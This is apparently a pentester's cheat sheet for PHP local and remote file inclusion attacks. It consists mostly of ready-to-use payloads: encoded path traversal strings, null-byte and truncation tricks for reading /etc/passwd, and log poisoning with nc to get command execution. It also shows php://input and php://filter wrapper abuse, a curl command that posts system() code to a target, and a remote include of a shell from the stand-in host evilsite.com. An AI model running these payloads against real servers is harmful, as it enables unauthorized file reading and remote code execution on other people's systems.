# LFI / RFI

- including uploaded files
- include data:// or php://input, php://filter pseudo protocol
- including logs
- including /proc/self/environ
- include session files - (usually names /tmp/sess_SESSIONID)
- include other files created by PHP application
- `C:\Windows\Temp\php<16-bit-random>.TMP` without bruteforce can do  `inc=C:\Windows\Temp\php<<`

## Path Traversal

```
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\
```

## LFI to RCE

### RCE with TXT upload
Expose .txt file and use a vulnerable `include` to include the txt file into code (evil.txt.php).

PHP config can be used to disable URL file access. But still local files can be accessed (allow_url_fopen / allow_url_include)

### RCE with Logs
- Use NC to write logs with malicious content to access_logs.
- Connect and just send the attack string (In user-agent etc.).
- Then include the log file (local file inclusion)

### RCE over SQLi
Return <?php echo "test"?> from SQL and see results to check if RCE is possible over SQLi

## References
- Universal LFI for Windows + PHP (using phpinfo): https://rdot.org/forum/showthread.php?t=1134
- https://www.owasp.org/index.php/Path_Traversal
- PHP LFI to arbitratry code execution via rfc1867 file upload temporary files: 

## PHP Wrappers

- File upload with POST data
  - `curl -s --data "<?system('ls -la');?>" "http://target.host/web.php?file_path=php://input%00"`
- Base64 encode the LFI
  - `http://X.X.X.X/?page=php://filter/convert.base64-encode/resource=(PHP FILE NAME NO EXTENSION)`

```
/proc/self/environ
C:\Windows\Temp\php<<

?file=.htaccess
?file=../../../../../../../../../var/lib/locate.db

?file=../../../../../../../../../var/log/apache/error.log
/var/log/httpd/error_log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log

/proc/self/fd/XX: http://pastebin.com/raw.php?i=cRYvK4jb

Null Byte Injection:
?file=../../../../../../../../../etc/passwd%00
Directory Listing with Null Byte Injection:
?file=../../../../../../../../../var/www/accounts/%00
Path Truncation:
?file=../../../../../../../../../etc/passwd.\.\.\.\.\.\.\.\.\.\.\ ...
Dot Truncation:
?file=../../../../../../../../../etc/passwd...........
Reverse Path Truncation:
?file=../../../../ […] ../../../../../etc/passwd

nc <IP> <port> GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1 Host: <IP> Connection: close
?lfi_file=/var/log/apache2/access.log&cmd=<command>


Including Remote Code:
?file=[http|https|ftp]://evilsite.com/shell.txt
Using PHP stream php://input:
?file=php://input
Specify your payload in the POST parameters
Using PHP stream php://filter:
?file=php://filter/convert.base64-encode/resource=index.php
Using data URIs:
?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=

auth.log

/proc/self/environ
index.php?p=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7%00
```